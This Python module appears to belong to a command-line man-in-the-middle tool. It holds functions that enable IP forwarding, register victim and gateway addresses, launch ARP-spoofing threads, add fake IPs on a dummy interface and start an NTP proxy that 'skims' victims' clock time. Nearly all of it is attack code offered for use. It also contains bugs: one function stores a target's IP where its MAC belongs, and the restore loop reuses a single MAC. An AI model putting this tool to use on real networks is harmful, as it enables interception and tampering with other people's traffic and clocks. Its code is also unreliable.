import _thread
import socket
import os
import spoofer
import time
from menu import bcolors
from ntp import NTProxy


def toggleIpforward(v):
    """
    Toggle ip forward in /proc/sys/net/ipv4/ip_forward
    :param v:
    :return:
    """
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path, "w") as f:
        if v.ipForward:
                print(0, file=f)
                v.ipForward = False
        else:
                print(1, file=f)
                v.ipForward = True
    return


def validIPAddress(ip):
    """
    Checks if it's a valid IP
    :param ip:
    :return:
    """
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False


def cls():
    """
    clears console
    :return:
    """
    os.system("clear")
    return


def getIp(name):
    """
    Returns ip from hostname
    :param name:
    :return:
    """
    tmp = []
    ips = socket.getaddrinfo(socket.gethostbyname(name), None)
    for x in ips:
        tmp.append(x[4][0])

    return tmp


def getGwIp(target):
    """
    Gets the gateway ip address assuming netmask 255.255.255.0
    :param target:
    :return:
    """
    tmp = target.split('.')
    gw = (tmp[0] + "." + tmp[1] + "." + tmp[2] + ".1")
    print("      Assuming default gateway is: " + gw)
    print("")
    return gw


def removeTargets(v):
    """
    Remove target from object vals
    :param v:
    :return:
    """
    if v.spoof:
        print("      " + bcolors.WARNING + "Turn off spoofer first" + bcolors.ENDC)
        time.sleep(1)
        return

    if len(v.targets) > 0:
        i = 1
        for x in v.targets:
            print(f"      {i} - {x}")
            i += 1
        print(f"      {i} - ALL")
    else:
        print("      " + bcolors.WARNING + "No targets" + bcolors.ENDC)
        time.sleep(1)
        return

    try:
        sel = int(input("      Enter selection you want to delete: ")) - 1
    except ValueError:
        print("      " + bcolors.WARNING + "Only input integers" + bcolors.ENDC)
        time.sleep(1)
        return
    except KeyboardInterrupt:
        return

    if sel == len(v.targets):
        v.targets = []
    elif sel > len(v.targets):
        print("      " + bcolors.WARNING + "Selection not in list" + bcolors.ENDC)
        time.sleep(1)
        return
    elif sel == 0:
        print("      " + bcolors.WARNING + "Default gateway removed, removing all targets" + bcolors.ENDC)
        v.targets = []
        time.sleep(2)
    else:
        v.targets.pop(sel)

    return


def removeNics(v):
    """
    Removes fake ips that have been setup
    :param v:
    :return:
    """

    if len(v.fakes) > 0:
        i = 1
        for x in v.fakes:
            print(f"      {i} - {x}")
            i += 1
        print(f"      {i} - ALL")
        try:
            sel = int(input("      Enter selection you want to delete: ")) - 1
        except ValueError:
            print("      " + bcolors.WARNING + "Only input integers" + bcolors.ENDC)
            time.sleep(1)
            return
        except KeyboardInterrupt:
            return

        if sel == len(v.fakes):
            v.fakes = []
            return
        elif sel > len(v.fakes):
            print("      " + bcolors.WARNING + "Selection not in list" + bcolors.ENDC)
            time.sleep(1)
            return

        bash = ("ip addr del  " + v.fakes[sel] + "/0 dev dummy label dummy")
        os.system(bash)
        v.fakes.pop(sel)
        return
    else:
        print("      " + bcolors.WARNING + "No fake NICs" + bcolors.ENDC)
        time.sleep(1)
        return


def startSpoof(v):
    """
    Starts arpspoofing
    :param v:
    :return:
    """
    if len(v.targets) < 2:
        print("      " + bcolors.WARNING + "Not enough targets" + bcolors.ENDC)
        time.sleep(1)
        return

    gw = v.targets[0]
    hgw = v.macs[0]
    j = 1
    if v.spoof:
        print("      " + bcolors.WARNING + "Already Spoofing" + bcolors.ENDC)
        time.sleep(1)
    v.spoof = True
    for x in v.targets[1:]:
        _thread.start_new_thread(spoofer.thread_spoof, (x, gw, v.macs[j], hgw, v))
        j += 1
    return


def restore(v):
    """
    Restores arpspoofing
    :param v:
    :return:
    """
    if not v.spoof:
        print("      " + bcolors.WARNING + "Currently not spoofing" + bcolors.ENDC)
        time.sleep(1)
        return

    gw = v.targets[0]
    hgw = v.macs[0]
    v.spoof = False
    j = 1
    for x in v.targets[1:]:
        spoofer.restore(x, gw, v.macs[j], hgw)
        spoofer.restore(gw, x, v.macs[j], hgw)
    return


def addFake(v):
    """
    adds fake ip to object vals
    :param v:
    :return:
    """
    fakes = input("      Enter IP addresses separated with a space: ")
    fakes = fakes.split(" ")
    tmp = True

    for x in fakes:
        if validIPAddress(x):
            bash = ("ip addr add " + x + "/0 dev dummy label dummy")
            os.system(bash)
            if len(v.fakes) == 0:
                v.fakes.append(x)
            else:
                for y in v.fakes:
                    if y == x:
                        tmp = False

                if tmp:
                    v.fakes.append(x)
                else:
                    print("      " + bcolors.WARNING + x + " already in list" + bcolors.ENDC)
                    tmp = True
                    time.sleep(1)

        else:
            print("      " + bcolors.WARNING + x + " is not a valid IP" + bcolors.ENDC)
            time.sleep(1)

    if len(v.fakes) > 0:
        bash = "ip a | grep -w inet"
        os.system(bash)
        print("      Created dummy NICs")
    else:
        print("      " + bcolors.WARNING + " no valid ips" + bcolors.ENDC)

    time.sleep(1)
    return


def addTarget(v):
    """
    Adds target to object vals
    :param v:
    :return:
    """
    if v.spoof:
        print("      " + bcolors.WARNING + "Turn off spoofer first" + bcolors.ENDC)
        time.sleep(1)
        return

    gw = ""
    target = input("      Enter IP address of target: ")
    if len(v.targets) == 0:
        gw = input("      Enter IP address of router (leave blank if same subnet): ")
        if validIPAddress(gw):
            tmp = spoofer.get_mac(gw)
            if tmp:
                v.targets.append(gw)
                v.macs.append(tmp)
            else:
                print("      " + bcolors.WARNING + target + " did not add " + gw + " since no mac found" + bcolors.ENDC)
                time.sleep(2)
                return
        else:
            gw = getGwIp(target)
            tmp = spoofer.get_mac(gw)
            if tmp:
                v.targets.append(gw)
                v.macs.append(tmp)
            else:
                print("      " + bcolors.WARNING + target + " did not add " + gw + " since no mac found" + bcolors.ENDC)
                time.sleep(1)
                return

    if validIPAddress(target):
        tmp = spoofer.get_mac(target)
        if tmp:
            v.targets.append(target)
            v.macs.append(target)
        else:
            print("      " + bcolors.WARNING + target + " did not add " + target + " since no mac found" + bcolors.ENDC)
            time.sleep(1)
            return

        return
    else:
        print("      " + bcolors.WARNING + target + " is not a valid ip address" + bcolors.ENDC)
        time.sleep(1)
    return


def interrupt(v):
    """
    Restores everything to base settings
    :param v:
    :return:
    """
    print("    " + bcolors.OKBLUE + "[!] Detected CTRL+C ! restoring setting, please wait..." + bcolors.ENDC)
    bash = "ip link delete dummy type dummy"
    os.system(bash)
    if v.spoof:
        restore(v)
    if v.ntpStatus:
        ntpToggle(v)
    print("      " + bcolors.OKGREEN + "Done")
    print("      --------------------------------------------------------" + bcolors.ENDC)
    exit()


def setup():
    bash = "modprobe dummy && ip link add dummy type dummy"
    os.system(bash)
    return


def ntpToggle(v):
    if v.ntpStatus:
        print("      " + bcolors.OKBLUE + "Working.." + bcolors.ENDC)
        v.ntpServer.stop()
        v.ntpServer.join()
        v.ntpSocket.close()
        v.ntpServer = ""
        v.ntpSocket = ""
        v.ntpStatus = False
    else:
        v.ntpSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        v.ntpSocket.bind(("0.0.0.0", 123))
        v.ntpServer = NTProxy(v.ntpSocket)
        v.ntpServer.set_skim_threshold("30s")
        v.ntpServer.start()
        v.ntpStatus = True
    return

